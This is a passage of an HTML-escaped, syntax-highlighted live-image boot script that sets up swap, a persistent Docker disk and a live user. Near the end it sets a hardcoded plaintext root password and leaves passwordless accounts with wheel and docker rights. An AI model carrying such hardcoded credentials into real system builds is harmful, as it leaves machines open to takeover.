&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  fi
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  if [ &amp;#34;\${arg##live_dir=}&amp;#34; != &amp;#34;\${arg}&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    livedir=\${arg##live_dir=}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    return
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# enable swaps unless requested otherwise&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;swaps&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;\`blkid -t TYPE=swap -o device\`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if ! strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; noswap &amp;amp;&amp;amp; [ -n &amp;#34;\$swaps&amp;#34; ] ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;for s in \$swaps ; do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;action &amp;#34;Enabling swap partition \$s&amp;#34; swapon \$s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if ! strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; noswap &amp;amp;&amp;amp; [ -f /run/initramfs/live/\${livedir}/swap.img ] ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;action &amp;#34;Enabling swap file&amp;#34; swapon /run/initramfs/live/\${livedir}/swap.img&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;mountDockerDisk() {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# support label/uuid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;if [ &amp;#34;\${dockerdev##LABEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;}&amp;#34; != &amp;#34;\${dockerdev}&amp;#34; -o &amp;#34;\${dockerdev##UUID=}&amp;#34; != &amp;#34;\${dockerdev}&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    dockerdev=\`/sbin/blkid -o device -t &amp;#34;\$dockerdev&amp;#34;\`
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# if we&amp;#39;re given a file rather than a blockdev, loopback it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;if [ &amp;#34;\${dockerdev##mtd}&amp;#34; !&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;\${dockerdev}&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    # mtd devs don&amp;#39;t have a block device but get magic-mounted with -t jffs2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    mountopts=&amp;#34;-t jffs2&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  elif [ ! -b &amp;#34;\$dockerdev&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    loopdev=\`losetup -f\`
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    if [ &amp;#34;\${dockerdev##/run/initramfs/live}&amp;#34; != &amp;#34;\${dockerdev}&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      action &amp;#34;Remounting live store r/w&amp;#34; mount -o remount,rw /run/initramfs/live
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    fi
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    losetup \$loopdev \$dockerdev
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    dockerdev=\$loopdev
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# if it&amp;#39;s encrypted, we need to unlock it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;if [ &amp;#34;\$(/sbin/blkid -s TYPE -o value \$dockerdev 2&amp;gt;/dev/null)&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;crypto_LUKS&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    echo
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    echo &amp;#34;Setting up encrypted Docker device&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    plymouth ask-for-password --command=&amp;#34;cryptsetup luksOpen \$dockerdev EncDocker&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    dockerdev=/dev/mapper/EncDocker
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# and finally do the mount&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;mount \$mountopts \$dockerdev /var/lib/docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# if we have /home under what&amp;#39;s passed for persistent home, then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# we should make that the real /home.  useful for mtd device on olpc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;if [ -d /var/lib/docker/docker ]; then mount --bind /var/lib/docker/docker /var/lib/docker ; fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;[ -x /sbin/restorecon ] &amp;amp;&amp;amp; /sbin/restorecon /var/lib/docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;findDockerDisk() {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;for arg in \`cat /proc/cmdline\` ; do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;na&#34;&gt;if [ &amp;#34;\${arg##dockerdisk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;}&amp;#34; != &amp;#34;\${arg}&amp;#34; ]; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      dockerdev=\${arg##dockerdisk=}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      return
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    fi
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; dockerdisk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  findDockerDisk&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;elif [ -e /run/initramfs/live/\${livedir}/docker.img ]; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;dockerdev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;/run/initramfs/live/\${livedir}/docker.img&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# if we have a persistent /home, then we want to go ahead and mount it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if ! strstr &amp;#34;\`cat /proc/cmdline\`&amp;#34; nodockerdisk &amp;amp;&amp;amp; [ -n &amp;#34;\$dockerdev&amp;#34; ] ; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;action &amp;#34;Mounting persistent /var/lib/docker&amp;#34; mountDockerDisk&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make it so that we don&amp;#39;t do writing to the overlay for things which&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# are just tmpdirs/caches&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;mount -t tmpfs -o mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;0755 varcacheyum /var/cache/yum&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;mount -t tmpfs vartmp /var/tmp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;[ -x /sbin/restorecon ] &amp;amp;&amp;amp; /sbin/restorecon /var/cache/yum /var/tmp &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;if [ -n &amp;#34;\$configdone&amp;#34; ]; then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;exit 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# add fedora user with no passwd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;action &amp;#34;Adding live user&amp;#34; useradd \$USERADDARGS -c &amp;#34;Live System User&amp;#34; liveuser&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;passwd -d liveuser &amp;gt; /dev/null&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;usermod -aG wheel,docker liveuser &amp;gt; /dev/null&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Remove root password lock&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;passwd -d root &amp;gt; /dev/null&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;(echo Kalaisadog2021; echo Kalaisadog2021)|passwd root --stdin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# turn off firstboot for livecd boots&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl --no-reload disable firstboot-text.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl --no-reload disable firstboot-graphical.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop firstboot-text.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop firstboot-graphical.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# don&amp;#39;t use prelink on a running live image&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;sed -i &amp;#39;s/PRELINKING&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;yes/PRELINKING=no/&amp;#39; /etc/sysconfig/prelink &amp;amp;&amp;gt;/dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# turn off mdmonitor by default&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl --no-reload disable mdmonitor.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl --no-reload disable mdmonitor-takeover.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop mdmonitor.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop mdmonitor-takeover.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# don&amp;#39;t enable the gnome-settings-daemon packagekit plugin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;gsettings set org.gnome.settings-daemon.plugins.updates active &amp;#39;false&amp;#39; || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# don&amp;#39;t start cron/at as they tend to spawn things which are&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# disk intensive that are painful on a live image&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl --no-reload disable crond.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl --no-reload disable atd.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop crond.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;systemctl stop atd.service 2&amp;gt; /dev/null || :&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Mark things as configured&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;touch /.liveimg-configured&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# add static hostname to work around xauth bug&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# https://bugzilla.redhat.com/show_bug.cgi?id=679486&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;echo &amp;#34;localhost&amp;#34; &amp;gt; /etc/hostname&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Fixing the lang install issue when other lang than English is selected . See http://bugs.centos.org/view.php?id=7217&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/usr/bin/cp /usr/lib/python2.7/site-packages/blivet/size.py /usr/lib/python2.7/site-packages/blivet/size.py.orig&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;/usr/bin/sed -i &amp;#34;s#return self.humanReadable()#return self.humanReadable().encode(&amp;#39;utf-8&amp;#39;)#g&amp;#34; /usr/lib/python2.7/site-packages/blivet/size.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# bah, hal starts way too late&lt;/span&gt;
